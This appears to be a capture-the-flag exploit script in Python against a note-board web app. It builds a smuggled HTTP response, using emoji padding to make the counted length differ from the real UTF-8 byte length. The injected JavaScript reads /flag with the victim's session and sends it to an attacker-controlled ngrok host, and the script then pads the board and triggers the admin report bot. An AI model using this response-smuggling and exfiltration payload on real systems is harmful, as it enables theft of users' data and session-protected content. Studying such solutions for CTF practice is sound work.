import requests

url = "http://35.224.135.84:3100"
self_url = "http://f56e216fa766.ngrok.io"


def get_payload() -> str:
    script = """<marquee id="title">Fetching flag...</marquee>
<script>
(async () => {{
    // Discard this first request because it will receive the padding at the
    // end of the payload.
    fetch('/flag', {{credentials: 'same-origin'}})

    const res = await fetch('/flag', {{credentials: 'same-origin'}})
    const flag = await res.text()
    fetch('{}/' + encodeURIComponent(flag))
    document.getElementById('title').textContent = 'Pwned'
}})()
</script>
""".format(
        self_url
    )

    payload = f"""HTTP/1.1 200 OK\r
Content-Type: text/html\r
Content-Length: {len(script)}\r
\r
{script}"""

    # p += "A" * 1448 * 200

    """
    len(pre)  # Fake len
    len(payload)  # Real len (ascii)

    len(total) = len(pre) + len(payload)
    pre_nbytes = 4 * len(pre)  # Each UTF-8 char is 4 bytes

    len(total) == pre_nbytes
    len(pre) + len(payload) == 4 * len(pre)
    len(payload) == 3 * len(pre)
    len(pre) = len(payload) // 3

    # Should be on a packet boundary.
    # Might be avoidable by padding with whitespace.
    # Let k be an integer.
    len(pre) + len(payload) = 1448 * k

    # Easy solution
    len(payload) = 1448 * 3
    len(pre) = 1448
    """

    payload_len = 1448 * 3
    payload = payload + "Z" * (payload_len - len(payload))
    pre = "😍" * (len(payload) // 3)

    ans = pre + payload
    i = len(ans)
    assert ans.encode()[i : i + 4] == b"HTTP"
    return ans


res = requests.get(f"{url}/create_board")
board_id = res.url.split("/")[-1]
print(f"[+] Board ID: {board_id}")

payload = get_payload()
data = {"id": board_id, "body": payload}
res = requests.post(f"{url}/board/add_note", json=data)
print(f"[*] Evil note: {res.status_code}")

# Make sure the other notes take longer to load
fluff = "A" * int(len(payload) * 1.5)

for i in range(6):
    data = {"id": board_id, "body": fluff}
    res = requests.post(f"{url}/board/add_note", json=data)
    print(f"[*] Fluff {i}: {res.status_code}")

print(f"{url}/board/{board_id}")

res = requests.get(f"{url}/board/{board_id}/report")
print(f"[*]: Report {res.status_code}")
